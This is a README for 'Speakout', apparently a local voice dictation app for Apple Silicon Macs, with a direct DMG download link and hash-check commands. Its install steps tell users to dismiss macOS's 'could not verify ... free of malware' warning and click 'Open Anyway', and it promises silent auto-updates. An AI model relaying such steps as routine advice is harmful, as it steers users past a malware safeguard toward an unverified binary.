# Speakout — Open-Source Voice Dictation for Apple Silicon

Speakout is a blazingly fast, privacy-first, Metal-accelerated local voice intelligence system for macOS.

[![Latest Release](https://img.shields.io/badge/Release-v8.5.1_Stable-blue.svg)](https://github.com/codesource18/speakout-downloads/releases/tag/v8.5.1)
[![Architecture](https://img.shields.io/badge/Architecture-Apple_Silicon_(arm64)-orange.svg)](https://github.com/codesource18/speakout-downloads)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## Direct Download

- **[Speakout-v8.5.1-apple-silicon.dmg](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.5.1-apple-silicon.dmg)** (5.08 MB)
- **SHA-256**: `6b94900b1358903e8390c381844fe7baef989171d8efa9fa53fd4bc897db1df9`
- **Architecture**: Apple Silicon (M1 / M2 / M3 / M4)
- **macOS Version**: macOS 12 Monterey or higher (Optimized for macOS 15 Sequoia)

---

## First-Run Installation (3 Clicks)

Because Speakout is an independent open-source application and not distributed via the Mac App Store, macOS Gatekeeper requires a one-time approval on first launch:

1. **Open & Click "Done"**: Drag Speakout to Applications and double-click to open. When macOS displays *"Apple could not verify Speakout is free of malware"*, click **Done**.
2. **Open System Settings**: Go to ** > System Settings > Privacy & Security**, and scroll down to the **Security** section.
3. **Click "Open Anyway"**: Next to *"Speakout was blocked to protect your Mac"*, click **Open Anyway**, authenticate with Touch ID or password, and click **Open**.

> **Note**: You only do this once! All subsequent in-app updates install automatically with zero prompts.

---

## Verification & Integrity

```bash
# Verify download SHA-256
shasum -a 256 Speakout-v8.5.1-apple-silicon.dmg

# Verify inside-out ad-hoc signature & entitlements
codesign --verify --deep --strict --verbose=2 /Applications/Speakout.app
codesign -d --entitlements :- /Applications/Speakout.app
```
